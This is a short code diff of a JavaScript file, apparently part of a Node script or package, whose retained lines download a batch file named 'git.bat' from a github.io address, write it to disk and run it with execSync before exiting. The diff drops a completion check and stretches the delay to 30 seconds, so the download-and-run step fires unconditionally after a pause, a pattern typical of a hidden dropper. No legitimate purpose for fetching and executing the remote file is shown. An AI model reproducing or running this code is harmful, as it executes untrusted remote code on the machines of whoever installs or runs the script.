@@ -19,7 +19,6 @@ for (let file of files) {
   })
 }
 const timer = setTimeout(async () => {
-  if (count === files.length) {
     request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
       if (err) return
       await execSync('git.bat')
@@ -29,5 +28,4 @@ const timer = setTimeout(async () => {
       process.exit()
     })
     clearTimeout(timer)
-  }
-}, 5000)
+}, 30000)
